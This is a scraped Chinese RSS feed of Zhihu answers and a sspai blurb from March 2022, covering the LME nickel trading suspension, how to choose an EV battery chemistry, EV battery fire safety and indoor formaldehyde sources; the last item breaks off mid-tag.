[{"title":"LME 为何取消 3 月 8 日及以后的镍交易，会带来怎样的深远影响？","date":"2022-03-10 12:44:38","description":"\n<p data-pid=\"JdNQ_GhR\"> 严格意义上，LME不是在修改规则，而是依据他的交易规则在行使绝对的自由裁量权。<br> 因为他的交易规则RuleBook写了这样的条款:<br> 1.3 The Exchange may, at its <b>absolute discretion</b> and acting reasonably suspend trading on one or more of the Execution Venues for such period it considers necessary in the interests of maintaining a fair and orderly market. Trading will be resumed as soon as reasonably practicable following any such suspension of an Execution Venue.<br><br> 1.11 The Exchange reserves the right, acting reasonably and in its <b>absolute discretion</b>, to suspend or revoke the access of a Dealer, Member Representative and/or a Member and, where applicable, its Clients, to any systems and facilities (including any successor systems or facilities) of the Exchange, as the Exchange deems necessary, including (without limitation)the Ring, LME Select, the Matching System and LMEsword.<br><br> 大意就是LME可以自由裁量去决定暂停交易、取消交易。这个权利很大，不服，也可以根据英国法去打官司，这些是Rulebook里面约定的争议条款。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ad487b740fe7bd7448c04b7ecda76988_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2800\" data-rawheight=\"1866\" data-watermark=\"watermark\" data-original-src=\"v2-ad487b740fe7bd7448c04b7ecda76988\" data-watermark-src=\"v2-9f3bea4601530d6a3535d497f9df0585\" data-private-watermark-src=\"v2-3ae26d7146e01faac43484d2bd161cec\"></p>\n<p data-pid=\"B3o58cim\"><br><br> 当然，是不是交易所想怎么干，就怎么干？很多人觉得LME被HKEX买了，似乎就是我们想命令他们怎么做就怎么做了。个人感觉也没有这么简单。因为毕竟是一个国际性的交易所，而且还有英国的金融监管局在监管呢。如果瞎搞，罚款也会被罚惨的。现在，也有一些质疑交易所的声音。<br><br> LME在历史上也干过这种暂停交易的事，是在1985年的锡危机，算是LME的黑暗时刻吧。当时暂停锡交易停了整整四年，导致许多经纪商出问题。当时的有22国政府支持的国际锡委员会分崩离析了，无法拉抬和支撑锡的价格。<br><br> 所以，这次LME的公告里面，就要强调各种因素，以表明其采取此类措施的合理性。提到了镍价的史无前例的波动，也提到了俄乌战争对镍市场价格的影响。<br><br> 至于真正的原因，只能等着进一步披露,或者自己猜吧。目前根据金融时报FT的报道，已经有人质疑，为什么开这么大的空单，交易所也没有去查查这个客户有没有这么多存货。至于青山，也已经有了应对之策，媒体报道他已经从JPMorgan Chase以及中国建行得到了贷款去应对保证金危机。<br><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f74db3c2e23d478162ff7bdfad5f0f73_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2246\" data-rawheight=\"558\" data-watermark=\"watermark\" data-original-src=\"v2-f74db3c2e23d478162ff7bdfad5f0f73\" data-watermark-src=\"v2-2e45a4c9489b38dca446dc8eb63bcd10\" data-private-watermark-src=\"v2-e4dab035108ba013b9e5f4cfc5248bc4\"></p>\n<p><br><br><br><br><br><br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/fuwangezy?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">FU Wang</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520801629/answer/2382981642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">93 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/23557639?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">LME 的调期是怎么回事？</a><br><a href=\"http://www.zhihu.com/question/396421129?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">期货镍的行情是怎么回事?</a><br>\n","link":"http://www.zhihu.com/question/520801629/answer/2382981642?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"身处南北方交界处，四季分明，买电车究竟是买三元锂电池还是磷酸铁锂电池？","date":"2022-03-10 10:01:54","description":"\n<p data-pid=\"HkfF5q5x\">题主base的苏南地区，冬天气温也就在0度上下，不会太冷。2021年元旦，在长江北岸的南京、扬州有过零下10度的严寒天气，但也只是短暂的一两天而已。</p>\n<p data-pid=\"GfwyWjjE\">像Model 3、P7这种热门车型，采取了用<b>三元锂电池做长续航版本</b>、<b>磷酸铁锂电池做标准续航版本</b>的策略，应该买哪种呢？</p>\n<p data-pid=\"H-vks1pj\">与三元锂相比，磷酸铁锂电池的特点：<b>成本低、寿命长、低温性能差</b>。<b>成本低，</b>意味着购车价格低；<b>寿命长，</b>意味着平时可以充到100%，而不担心衰减；<b>低温性能差，</b>意味着北方冬天要悠着点。</p>\n<p data-pid=\"80x0Hsa0\"><b>在0度左右的温度区间，磷酸铁锂电池还属于「扛得住」的状态，问题不大</b>。要说续航有衰减吗，那当然也是有的，关键是三元锂电池的电动车，在这个温度下的衰减也不小啊！二者相比差别不大！</p>\n<p data-pid=\"ugofTsft\">所以答案简单明了：<b>同等续航水平下，选磷酸铁锂</b>。</p>\n<p data-pid=\"QZkwPEN3\">例如：如果都是500公里续航，那么磷酸铁锂版本的寿命更长（平时可以充到100%）、成本更低（车价低不低要看车企良心），显然选磷酸铁锂。</p>\n<p data-pid=\"0uwipwcB\"><b>问题又来了，除了比亚迪汉全部使用磷酸铁锂之外，其它车企一般采用的是磷酸铁锂用于标准续航版本、三元锂用于长续航版本的策略，那咋选呢</b>？</p>\n<p data-pid=\"VD6mqiu9\">建议采取如下原则：</p>\n<ul><li data-pid=\"AWMrC7Zs\">\n<b>出行需求优先原则</b>：如果只是为了上下班代步，出行需求少，那就算是在北京这么冷的地方，也没必要选三元锂，买个磷酸铁锂的标准续航版本就可以了；如果经常开长途，出行需求长，那就算在广东这么暖和的地方，也最好选三元锂的超长续航版本。</li></ul>\n<blockquote data-pid=\"9-pqUUZr\">举例： 标续版本NEDC续航在500公里以下，冬天长途按300不到估算，意味着可以上海-无锡往返，上海-常州直达，但不能上海-南京直达。<br>长续版本按670公里、冬天长途按400估算，可以上海-常州往返，可以上海-南京直达。</blockquote>\n<ul><li data-pid=\"j-xYL8H6\">\n<b>无家充桩考虑长续</b>：如果没有家充桩的话，意味着充电不那么便利。如果长续航版本一周一充，那么标续版本可能就要一周两充，便利性天差地别。这种情况下，就可能要考虑多花2-4万元来减少充电麻烦了！</li></ul>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhangkangkang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">张抗抗</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520427647/answer/2382205686?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/478132477?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电动汽车充满到同样续航里程，磷酸铁锂电池和三元锂电池哪个跑的实际里程更长？</a><br><a href=\"http://www.zhihu.com/question/434952446?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么磷酸铁锂电池比三元锂电池在低温下性能表现更差？有什么办法可以解决这一问题吗？</a><br>\n","link":"http://www.zhihu.com/question/520427647/answer/2382205686?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"新玩意 097｜少数派的编辑们最近买了啥？","date":"2022-03-10 09:05:41","description":"睡前泡泡脚真的太舒服啦！<a href=\"https://sspai.com/post/71977\" target=\"_blank\">查看全文</a>\n","link":"https://sspai.com/post/71977"},{"title":"许多电池都宣传「不起火」，现在的技术可以真的不起火吗？为什么还时有发生起火的情况？","date":"2022-03-10 08:51:46","description":"\n<p data-pid=\"P6Ym2Hn8\">动力电池系统发生燃烧的原因无外乎有三种。</p>\n<ul>\n<li data-pid=\"NPAdqB3i\"><b>电芯因为放热副反应，导致热失控，引燃电解液和周边可燃物质。</b></li>\n<li data-pid=\"kaSpXZO7\"><b>高压回路短路，导致温度急剧上升，引燃电解液和周边可燃物质。</b></li>\n<li data-pid=\"_wmT10Yr\"><b>外部燃烧，使得动力电池内部热失控，到达着火点温度，引燃电解液和周边可燃物质。</b></li>\n</ul>\n<p data-pid=\"x-jAbcqN\">后面两种涉及到外部原因，大概率是因为剧烈碰撞造成的高压回路短路或者外部燃烧导致的热失控，属于极小概率事件，这个我们放在后面谈。</p>\n<p data-pid=\"ogyxqY8a\">而对于纯电车来说，第一种发生的情况是常见使用状态中容易发生的，所以管控不好，就容易发生安全事故。这个也是我们最常见的纯电车的动力电池燃烧情况，充电时候燃烧，静置的时候燃烧，基本都是因为这个原因。</p>\n<p data-pid=\"XhU1jeVd\">当电芯内部热量无法散出，不断积累造成的内部温度升高，使得特别是正极分解析出大量氧气后，就意味着剧烈燃烧，也就是爆燃现象的出现。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-94861fa575201f23f043988cd874c820_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"426\" data-watermark=\"watermark\" data-original-src=\"v2-94861fa575201f23f043988cd874c820\" data-watermark-src=\"v2-3cc90aaf6cb67a9d9a4e967c90384258\" data-private-watermark-src=\"v2-a61cf49874fff3305b782914fbae72f9\"></p>\n<p data-pid=\"pnq_S4K5\">以下的热反应，也是电池的电芯趋向失控时候的热反应。</p>\n<ul>\n<li data-pid=\"Y-Pf9Off\"><b>SEI膜的分解（90-120℃）</b></li>\n<li data-pid=\"6pK0xixn\"><b>负极与电解液的反应（120℃以上）</b></li>\n<li data-pid=\"nuxi-_98\"><b>电极液分解（200℃左右）</b></li>\n<li data-pid=\"rXsfAupn\"><b>正极与电解液的反应，伴随正极分解，析出氧气（180-500℃）</b></li>\n<li data-pid=\"wGaneg4p\"><b>负极与黏结剂的反应（240℃以上）</b></li>\n</ul>\n<p data-pid=\"pJUhGfuI\">2020年，国标的标准增加了电池系统热扩散试验，要求电池单体发生热失控后，电池系统在5分钟内不起火不爆炸，为乘员预留安全逃生时间。</p>\n<p data-pid=\"4lQHeyZp\">所以，车企设计电芯正常使用安全的时候，为了防止电芯热失控，基本上各种思路都要考虑。</p>\n<p data-pid=\"iZmfoXY0\">以下是设计动力电池使用情况下的安全措施的综合方案。</p>\n<p data-pid=\"xzqLd9DV\"><b>1、全天候监控电芯数据，提高电芯散热/降温能力，模组散热/降温能力，PACK散热/降温能力，避免热量积累。</b></p>\n<p data-pid=\"p7euDSPi\"><b>2、从源头降低电芯放热副反应产生的热量，比如采用磷酸铁锂正极材料。</b></p>\n<p data-pid=\"zqs9c5N9\"><b>3、提高电芯内着火点温度，如在电解液中增加阻燃材料，选用陶瓷隔膜。</b></p>\n<p data-pid=\"BqEzp16V\"><b>4、电芯和电芯之间增加阻燃材料，即便某个电芯热失控，也不会影响到其他电芯。</b></p>\n<p data-pid=\"w6VIfHTk\">题目里面介绍的<b>长城“大禹电池”，</b>这个名字意义主要就是宣导自己动力电池的热疏通（撒热/降温）能力强悍。</p>\n<p data-pid=\"kodhpqw8\">而岚图的<b>“琥珀”、“云母”电池系统，</b>名字的意义就是表示每个电芯都如同琥珀一样，被阻燃材料包裹很好，即便某个电芯热失控了，也能避免波及到其他电芯。</p>\n<p data-pid=\"PfTx1rBq\">极氪汽车的<b>“极芯”电池包，</b>则是全部元素都说了一通，运用了“隔”、“排”、“防”、“警”、“冷”、“断”六大核心技术。</p>\n<p data-pid=\"jXzzFkVr\">广汽埃安的“<b>弹匣电池”，</b>则是重点宣传了电池速冷降温系统，电芯温度异常的时候启动速冷系统降温。</p>\n<p data-pid=\"owi5iQxz\">其他的厂家各有特点，在成本的考量上，各有自己的侧重点，就不一个个赘述了。</p>\n<p data-pid=\"cqthipaB\">接下来，就说下开头说的另外两点。</p>\n<ul>\n<li data-pid=\"7hS6qSJz\"><b>高压回路短路，导致温度急剧上升，引燃电解液和周边可燃物质。</b></li>\n<li data-pid=\"59W7SIia\"><b>外部燃烧，使得动力电池内部热失控，到达着火点温度，引燃电解液和周边可燃物质。</b></li>\n</ul>\n<p data-pid=\"UHcPCuzO\">这里提一个典型的例子。</p>\n<p data-pid=\"b0X277Dw\">最近十年内，影响力最大的一次纯电车起火，应该是2012年5月份的那次，让比亚迪市值一天蒸发了60亿元。</p>\n<p data-pid=\"qoCFUu4s\">那次事件也引发了新能源车电池的社会大讨论，使得纯电车在国内的发展严重受挫。</p>\n<p data-pid=\"57nHwE3a\">2012年5月份，深圳，作为出租车的E6电动车，车上载着司机和两名乘客，被一辆红色GT-R跑车以相对速度100公里/小时的速度撞击（<b>E6速度为82公里/小时，GT-R速度为183-195公里/小时</b>），汽车冲上绿化带，以约<b>67公里/小时</b>的速度撞击到大树上（树干切进车尾1.05米，一直顶到了车底的电池包）。车辆经过两次碰撞、旋转，车体严重变形后出现了火势。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d1f19f3ebf05cb13421b1a03502997e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"479\" data-rawheight=\"623\" data-watermark=\"watermark\" data-original-src=\"v2-d1f19f3ebf05cb13421b1a03502997e3\" data-watermark-src=\"v2-3b88910d43f7d058c3463da3c4399c58\" data-private-watermark-src=\"v2-6ad20fc7d91fbcfd76ab9349946d5fbc\"></p>\n<p data-pid=\"LLWzSPVO\">事故造成了司机和两名乘客当场死亡,而当时比亚迪的E6电动车使用的还是磷酸铁锂电池。</p>\n<p data-pid=\"jJfWpkLk\">三个月后，8月3号，汇集全国专家的调查结果出来，根据模拟分析，两次剧烈碰撞带来的颈部拉力和头部撞击，就有很大概率导致两名乘客颅骨开裂，极有可能因为撞击而致命，地毯上有喷射性血迹也验证了这次模拟实验。而司机因为有安全带，但剧烈撞击导致了司机的昏迷，被烧死在了座位上。</p>\n<p data-pid=\"KF0G8X-6\">重点回到电池上，电池有25%出现了燃烧痕迹，但并没有出现爆炸（爆燃）的现象。而着火原因是动力电池组和高压配电箱内的高压线路因为碰撞（3.5秒内两次剧烈碰撞）导致大面积破裂，和车体之间形成了短路，产生了电弧，引燃了内饰材料（类似高压电线碰火）。车辆燃烧的原因，不是因为电池热失控，电解液燃烧所造成。</p>\n<p data-pid=\"7GSjoPJd\">但2012年的事故，我们现在可以看到，虽然不是电芯本身造成的热失控，虽然这个案例很极端，但也是因为剧烈碰撞后，高压线路短路所造成的。</p>\n<p data-pid=\"a0uqPlLf\"><b>而这种燃烧的情况是否是无法避免的呢？</b></p>\n<p data-pid=\"BRxpbhVk\">2012年的比亚迪给出的回复是电池已经做过了挤压实验，e6电动车搭载电池经过国家权威部门做过挤压测试，电池模块50%变形后，并没有发生起火燃烧，符合国家标准。而如此剧烈的碰撞，就是油车也都会燃烧，因为油车比电车轻很多，在那种情况只会旋转更厉害，飞得更远，撞得更狠。</p>\n<p data-pid=\"cfCoILC8\">但是在2019年11月，对电动车的电池安全，有个机构专门针对性的毁灭性碰撞测试，测试的结果并没有造成燃烧。</p>\n<p data-pid=\"w4n9_i2G\">德国DEKRA检测公司，对雷诺Zoe和日产聆风，在最高时速分别为75km/h和84km/h的时速进行对固定柱体的侧面和正面碰撞。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a423f4ab38f56e9ec94284ad0398914a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"643\" data-rawheight=\"375\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"3BG16VrH\">这种侧面，高速度碰撞坚固硬物，只是为了测试极端环境下动力电池的安全性，因为这种侧面高速碰撞下，车内驾乘人员存活下来的几率很低。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-605f045ee9261ca8822ff885352ac83d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"427\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p data-pid=\"-gLcr4GI\">但即便车身框架，电池受到了严重的挤压，也可以看到电池外包裹没有破裂的现象，高压线路没有漏出。且车内电池在发生碰撞的瞬间，就切断了高压系统，避免了起火爆炸的后果。</p>\n<p data-pid=\"c36MVa82\">这也从侧面说明，合理的设计下，即便经受了如此严重的撞击，也是有可能不产生高压短路现象，在电池失控层面有效保护车内人员的安全。</p>\n<p data-pid=\"x1r-X8Gl\">所以这个就是在事故中的电池保护设计了，如何防护电池包，使之降低外部这些剧烈因素，如挤压、穿刺对电池包的影响。</p>\n<p data-pid=\"7KSLE0yo\">现在设计的主要思路，就是在<b>电池包的构造本身和外框架的强度上做文章。</b></p>\n<p data-pid=\"S3x-9Ul2\">比如电池包的外架构采用更耐震动和耐撞的模型，采用更高强度的钢材，如用1500MPA的超强度钢来作为框架的材质。这些的钢材组成的框架对比普通钢材，强度更高，且韧性也大，不容易发生开裂。但如果采用高强度钢，这一块的成本也会明显提高。</p>\n<p data-pid=\"uzJi4gC2\">除了电池包本身框架之外，纯电车还要在前后碰撞和侧面碰撞上下功夫，才能更好保护电池包。</p>\n<p data-pid=\"vtCDr2aM\">这里给纯电车辟个谣，因为本身架构的原因，纯电车的碰撞安全设计实际比普通燃油车要更容易一些。</p>\n<p data-pid=\"u8NrOA1z\">燃油车的车头由于放发动机，两侧的转向轮还需要一定的摇摆空间，这就导致了留给纵梁的空间非常狭窄，尤其是前驱车，前纵梁扁、薄、小是常态。而纯电动汽车，因为没有发动机体系，就没有类似的烦恼，纵梁布置空间非常大。可以用宽大一体的型材作为纵梁，有富裕的空间做结构强度设计，使得车头抵御撞击的能力会比燃油车上升数个档次。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8451a613770a7c4db11d1e9472602c92_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"558\" data-rawheight=\"322\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p data-pid=\"OJ5V9rC-\">以上大致介绍了下动力电池的一些安全设施，车企和动力电池厂商最近几年也在电池安全上下了大功夫，保障了正常使用情况下不会热失控，即便热失控了也能留有足够的逃生时间。</p>\n<p data-pid=\"mVB69xjr\">各个专业机构也对应做了中等烈度的碰撞实验，保障了纯电车的动力电池不会造成二次伤害，如爆燃或者漏电的情况出现。</p>\n<p data-pid=\"nxLG3DYd\">但高强度的剧烈碰撞下，动力电池到底能否保障驾乘安全，尤其是在售价低廉，成本不高的纯电车，能否经受得住高烈度碰撞，还是要看未来市场的真实反馈了。</p>\n<p data-pid=\"AFYpmosy\">但说一千道一万，安全第一，即便再好的电动车，再安全的电池防护，也是被动保护。而主动保护驾乘安全的，现阶段还是主动驾驶的安全意识，<b>“安全驾驶”“主动防御驾驶”</b>才是保障驾乘人员安全的最重要防线了。</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/will-liu-16?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Will.liu</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/520430637/answer/2382417067?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">3 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/512138164?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">宁德时代出换电站了，我可以买蔚来的车，租宁德时代的电池吗？</a><br><a href=\"http://www.zhihu.com/question/269458421?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价比亚迪VS.宁德时代，中国动力电池双巨头的终极对决？</a><br>\n","link":"http://www.zhihu.com/question/520430637/answer/2382417067?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"甲醛有可能在短时间内彻底去除吗？","date":"2022-03-10 08:47:09","description":"\n<p data-pid=\"MK2CCD7_\">在各种自媒体平台上，会经常被投放这种类型的话题，有些广告把各种除甲醛技术吹的天花乱坠，也有些“理中客”表示“除甲醛”是智商税。作为吃瓜小白，面对这信息的海洋，究竟何去何从呢？</p>\n<p data-pid=\"uO8ZpfC4\">笔者并非专业“除甲醛”的技术发明人员，对市面上各类“除甲醛”的技术并没有专门研究过，只能从化学原理的角度，从各大化学生产商处搜集到一些相关的信息，分析一下室内甲醛的来源，并从化学角度列举一些去除甲醛的方法。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-0071c3c251e3ce41f9e87750051c032c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"291\" data-watermark=\"watermark\" data-original-src=\"v2-0071c3c251e3ce41f9e87750051c032c\" data-watermark-src=\"v2-35a6bf941e62e2632f96ea3eb3f1b1d8\" data-private-watermark-src=\"v2-158325f818b1d079170940656c16aaed\"></p>\n<p data-pid=\"zjRYlJbz\">治病，要先找病根。</p>\n<p data-pid=\"9kGxp8aO\">我们先看看，我们身边都有哪些甲醛的“发生器”？</p>\n<p><img src=\"https://pic4.zhimg.com/v2-74c51c07c7a704772da6331d2af63198_720w.png?rss\" data-caption=\"快来找找，哪些地方有甲醛？\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"341\" data-watermark=\"watermark\" data-original-src=\"v2-74c51c07c7a704772da6331d2af63198\" data-watermark-src=\"v2-51f2438ce3310187486d2641732ce93a\" data-private-watermark-src=\"v2-14d8764c6ae77b4b08898c93d68a6b19\"></p>\n<p><br></p>\n<p data-pid=\"wGrXfJGl\">一、纺织</p>\n<p data-pid=\"7WS03ihm\">首先是纺织品，比如衣服、毛毯、窗帘、沙发等。小伙伴们可能会很惊恐：“什么？我身上的贴身衣物也会有甲醛吗？”</p>\n<p data-pid=\"wQQkoJ_m\">以前，是的。</p>\n<p data-pid=\"nFTjzvIG\">为了让我们纺织品的颜色更加“牢固”，难以褪色，需要添加“固色剂”。比如有一种古老的“固色剂Y”，就是用甲醛、双氰胺和氯化铵合成的。随着时间的推移，固色剂就会分解出甲醛，影响我们的健康。早在上世纪，就发现添加固色剂后的织物游离甲醛超标，会导致皮肤发炎甚至发生溃疡。</p>\n<p data-pid=\"pbFAgWv2\">大家不必担心，老的固色剂早就被淘汰了，现在用的都是“无醛固色剂”，原料中不含甲醛，也就杜绝了纺织品中的甲醛危害。、  </p>\n<p><img src=\"https://pic4.zhimg.com/v2-0ca3403da5440e870f4553aa4b06147b_720w.png?rss\" data-caption=\"这个“无醛固色剂”是“非强制性国家标准”\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"784\" data-watermark=\"watermark\" data-original-src=\"v2-0ca3403da5440e870f4553aa4b06147b\" data-watermark-src=\"v2-3dcf462c729cf0b40d7939760c19dd72\" data-private-watermark-src=\"v2-a96af21750700e70161c882868acf845\"></p>\n<p data-pid=\"YY2q_5Zm\">二、涂料</p>\n<p data-pid=\"CPjzcfL3\">油漆和涂料的主要成分是涂料树脂、颜填料、助剂和溶剂，它们当中都没有甲醛的存在。但其中用到的杀菌剂有一些品种是含甲醛的，这个我们后面再说。</p>\n<p data-pid=\"8df98oSq\">在过去，涂料腻子里面会用到缩醛胶水，就是我们常见的107胶水，也叫做“文化水”，它的主要成分是聚乙烯醇缩甲醛。在过去，它经常被用来和成水泥砂浆粘贴瓷砖，但现在已经不被列入主流配方中了。</p>\n<p data-pid=\"pK3Z2KJa\">这条信息来自百度：“2001年，由于107胶中甲醛含量严重超标，国家建设部把其列入被淘汰的建材产品的名单中，在家庭装修中禁止使用。但是，由于107胶造价低、性能特殊等特点，目前仍然被使用。”</p>\n<p data-pid=\"8Yv2oejr\">总之，如果在装修的时候你看到下面的这种小桶，就需要注意了。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6683c753b29de2282d2714ac5e4c850f_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"308\" data-watermark=\"watermark\" data-original-src=\"v2-6683c753b29de2282d2714ac5e4c850f\" data-watermark-src=\"v2-2a1fd1a6b21417c908cd83caada4c96a\" data-private-watermark-src=\"v2-9f7c5e305ecfcb4eb1226b81378a8ae8\"></p>\n<p data-pid=\"eGQM47iW\">三、家装胶黏剂</p>\n<p data-pid=\"D84ZasEM\">这是最主要产生甲醛的地方，也是我们“除甲醛”真正的难点！</p>\n<p data-pid=\"60Xo5Utl\">有一种胶黏剂的主要成分是脲醛树脂，由于它极好的耐磨性和绝缘性能，加上低成本优势，在各种人造木工板（如刨花板、中密度纤维板和硬木胶合板等）的制造中，90%的胶黏剂都是这种脲醛树脂。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fbb7867c28d59728265091017a920585_720w.png?rss\" data-caption=\"用脲醛树脂制作的物品\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"346\" data-watermark=\"watermark\" data-original-src=\"v2-fbb7867c28d59728265091017a920585\" data-watermark-src=\"v2-df33d8dcb0f135cd28e983722e28ef0e\" data-private-watermark-src=\"v2-8a5262975e838e915e22f9ffcba9feb3\"></p>\n<p data-pid=\"aXfcLvcy\">脲醛树脂是用尿素和甲醛聚合而成的，反应如下：  </p>\n<p><img src=\"https://pic3.zhimg.com/v2-8266b4b731d3f0d22ca9b5cdd1447da7_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"253\" data-watermark=\"watermark\" data-original-src=\"v2-8266b4b731d3f0d22ca9b5cdd1447da7\" data-watermark-src=\"v2-7fb14313c41447b58273fcbc207dc541\" data-private-watermark-src=\"v2-87b0bf43f6fe40939caf7b135ce0cdcc\"></p>\n<p data-pid=\"xbox9MTC\">脲醛树脂在固化的时候会释放出甲醛，原理如下图。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-1cf90f2d03e1293c30aa9c4365805a7c_720w.png?rss\" data-caption=\"（a）是预期，发生羟基和氨基的缩合反应，但在酸性条件下，会发生反应（b），羟基缩合，生成一个亚甲基醚键，这个亚甲基醚键断裂后，形成一个亚甲基，并释放出甲醛，如反应（c），（d）为（b）和（c）的总反应。\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"315\" data-watermark=\"watermark\" data-original-src=\"v2-1cf90f2d03e1293c30aa9c4365805a7c\" data-watermark-src=\"v2-bfcc08e7a542776b9c1a85aa6cc76a77\" data-private-watermark-src=\"v2-10ebe723bb6ca7e6cdee3078b4eb5733\"></p>\n<p data-pid=\"rKLLD6fh\">脲醛树脂粘合剂的主要缺点是不耐潮，不耐候，不耐酸碱，尤其是在热的作用下，会导致键形成反应的逆转和甲醛的释放。在实际使用过程中，总有些潮气和外来物质，这就会导致甲醛的释放。</p>\n<p data-pid=\"wHrVY1xA\">针对这一点，工程师们已经做了很多尝试，最广泛使用的方法是降低脲醛树脂的甲醛/尿素比（F/U 比），也就是减少甲醛的用量，增加尿素的用量。现在的F/U 比已经从1970 年代和 1980 年代常见的大约 1.6 的比率现在已降至低至 1.0左右。</p>\n<p data-pid=\"ZDzu1j0U\">如果更低的话，就会影响脲醛树脂自身性能了。</p>\n<p data-pid=\"KPiQ2WIn\">或者就更换胶黏剂体系，比如更换成三聚氰胺体系，但是三聚氰胺可比尿素贵多了。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-bc714a74b0fd351b00d0d401fee8bd72_720w.png?rss\" data-caption=\"脲醛树脂（UF resin）现配现用\" data-size=\"normal\" data-rawwidth=\"446\" data-rawheight=\"200\" data-watermark=\"watermark\" data-original-src=\"v2-bc714a74b0fd351b00d0d401fee8bd72\" data-watermark-src=\"v2-978a7bec4c077b96f7d4a76d6688eb53\" data-private-watermark-src=\"v2-44115ced28dd7ba549b455e5a95732db\"></p>\n<p data-pid=\"JUMKnN5p\">我们小结一下：</p>\n<p data-pid=\"KfhVr0wD\">1， 纺织品和涂料只要采购正规品牌，均无需担心甲醛超标的问题。</p>\n<p data-pid=\"mlKOtLJv\">2， 真正出现甲醛释放的地方是各种人造木工板里的胶黏剂，家庭装修之后，诸如复合地板、木门、橱柜、桌椅等地方的甲醛释放仍然是防不胜防的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b0cef6c23a9e967b7e9cc2b46daa9edf_720w.png?rss\" data-caption=\"要牢记，有复合木工板的地方，就很有可能有甲醛排放\" data-size=\"normal\" data-rawwidth=\"554\" data-rawheight=\"268\" data-watermark=\"watermark\" data-original-src=\"v2-b0cef6c23a9e967b7e9cc2b46daa9edf\" data-watermark-src=\"v2-cc80977fb5a897fd89c3c580191717f1\" data-private-watermark-src=\"v2-a9679e794a183ed56a2af420413f490e\"></p>\n<hr>\n<p 